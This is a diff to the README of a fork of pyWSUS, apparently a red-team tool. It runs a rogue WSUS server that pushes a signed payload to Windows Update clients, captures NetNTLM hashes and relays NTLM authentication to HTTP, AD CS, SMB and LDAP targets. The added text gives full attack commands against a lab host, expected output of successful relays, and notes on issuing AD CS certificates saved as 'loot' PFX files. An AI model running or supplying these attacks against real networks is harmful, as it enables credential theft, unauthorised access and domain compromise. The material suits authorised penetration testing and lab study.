@@ -2,7 +2,16 @@
 
 Rogue WSUS-over-HTTP server that keeps Windows Update Agent (WUA) talking while serving controlled WSUS metadata and a Microsoft-signed payload.
 
-This fork adds NTLM capture, basic HTTP relay, and AD CS `/certsrv/` validation/issuance.
+This fork adds NTLM capture plus HTTP, AD CS, SMB, and LDAP/LDAPS relay handling.
+
+## Capabilities
+
+- WSUS SOAP emulation, client fingerprinting, update metadata, payload delivery, and session rotation.
+- NTLM Type 1/Type 3 capture with NetNTLMv1/v2 hash and JSONL output.
+- HTTP/HTTPS authentication relay and AD CS `/certsrv/` validation or certificate issuance.
+- SMB authentication proof, share listing, and in-memory kept sessions.
+- LDAP/LDAPS authentication proof, RootDSE, Who Am I, and base-object validation.
+- WinRM is not implemented yet.
 
 ## Install
 
@@ -39,6 +48,51 @@ python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
   --ntlm-mode relay-http \
   --relay-target http://target.lab.local/protected/ \
   --relay-action auth-only \
+  -v
+```
+
+SMB relay:
+
+```bash
+python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
+  --ntlm-mode relay-smb \
+  --relay-target smb://192.168.56.102/ \
+  --relay-action list-shares \
+  --json-events relay-smb.jsonl \
+  -v
+```
+
+Keep an SMB session:
+
+```bash
+python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
+  --ntlm-mode relay-smb \
+  --relay-target smb://192.168.56.102/ \
+  --relay-action keep-session \
+  --json-events relay-smb-session.jsonl \
+  -v
+```
+
+LDAP relay with RootDSE validation:
+
+```bash
+python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
+  --ntlm-mode relay-ldap \
+  --relay-target ldap://192.168.56.102/ \
+  --relay-action ldap-rootdse \
+  --relay-preflight \
+  --json-events relay-ldap.jsonl \
+  -v
+```
+
+LDAP base-object validation over LDAPS:
+
+```bash
+python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
+  --ntlm-mode relay-ldap \
+  --relay-target ldaps://192.168.56.102/ \
+  --relay-action ldap-base-search \
+  --json-events relay-ldaps.jsonl \
   -v
 ```
 
@@ -88,9 +142,10 @@ HTTP relay result  identity=DOMAIN\DC02$ ... authenticated=True validation=type3
 ## Useful Options
 
 ```text
---ntlm-mode {off,challenge-only,capture,relay-http}
+--ntlm-mode {off,challenge-only,capture,relay-http,relay-smb,relay-ldap}
 --relay-target URL
---relay-action {auth-only,adcs-certsrv,adcs-issue}
+--relay-action {auth-only,adcs-certsrv,adcs-issue,list-shares,keep-session,ldap-rootdse,ldap-whoami,ldap-base-search}
+--relay-preflight
 --relay-adcs-marker TEXT
 --adcs-template NAME
 --adcs-alt-name UPN
@@ -108,6 +163,9 @@ Interactive keys:
 ```text
 q  quit
 r  rotate session
+s  show kept SMB sessions
+l  list shares from kept SMB sessions
+x  close kept SMB sessions
 ```
 
 ## Expected Signals
@@ -126,6 +184,19 @@ AD CS relay validation:
 HTTP relay result ... authenticated=True validation=type3-and-followup followup=accepted service=adcs-web-enrollment service_validated=True
 ```
 
+SMB relay:
+
+```text
+SMB relay result ... authenticated=True validation=smb-session-setup service=smb service_validated=True signing_required=False shares=5
+SMB relay result ... authenticated=True validation=smb-session-setup service=smb session_id=1 action_state=session-kept
+```
+
+LDAP relay:
+
+```text
+LDAP relay result ... authenticated=True validation=ldap-bind service=ldap service_validated=True transport=ldap rootdse=True base_dn=DC=domain,DC=lab action_state=rootdse-read
+```
+
 AD CS issuance:
 
 ```text
@@ -138,7 +209,12 @@ HTTP relay result ... adcs_issued=True cert_id=42 pfx=loot/DOMAIN_HOST_.pfx
 - Use `--ntlm-session-key connection` for stricter IP+source-port tracking.
 - NetNTLMv2 output format: `user::domain:challenge:nt_proof:client_blob`.
 - Generated state includes `data/known_clients.json`, `netntlm-captures.txt`, optional JSONL event logs, and optional PFX loot.
+- `relay-smb` uses Impacket's SMB relay client; SMB signing required on the target usually blocks relay.
+- `keep-session` keeps an authenticated Impacket SMB session in memory for the current pyWSUS process.
+- `relay-ldap` uses Impacket's LDAP/LDAPS relay client. Its LDAP actions are read-only: RootDSE, Who Am I, and a base-object search.
+- `--relay-preflight` performs an unauthenticated RootDSE query before the WSUS listener accepts requests.
 - `adcs-certsrv` probes `/certsrv/certrqxt.asp`; `adcs-issue` submits a CSR and saves a PFX.
+- JSON relay results include target cookies and AD CS debug HTML paths when issuance fails.
 
 ## Credits
 
